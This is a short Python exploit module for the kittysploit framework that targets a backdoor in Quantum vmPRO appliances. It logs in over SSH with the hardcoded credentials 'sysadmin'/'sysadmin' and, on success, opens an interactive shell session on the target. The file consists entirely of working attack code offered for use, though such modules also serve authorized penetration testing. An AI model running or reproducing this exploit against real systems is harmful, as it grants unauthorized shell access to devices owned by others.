from kittysploit import *
from lib.protocols.ssh.ssh_client import Ssh_client
from lib.exploit.handler import Handler

class Module(Exploit, Ssh_client, Handler):


	__info__ = {
			'name': 'Quantum vmPRO Backdoor Command',
			'description': "Any user, even one without admin privileges, can get access to the restricted SSH shell",
			'cve': '',
			'payload': {
				'default':'nopayload',
				}			
		}

	ssh_target = OptString("", "Target IPv4", "yes")
	ssh_port = OptPort(22, "Target SSH port", "yes")

	def run(self):
		
		client = self.open_ssh(user="sysadmin", password="sysadmin")
		connection = client.login()
		if connection:
			self.handler_ssh(connection)
		else:
			self.not_vulnerable()
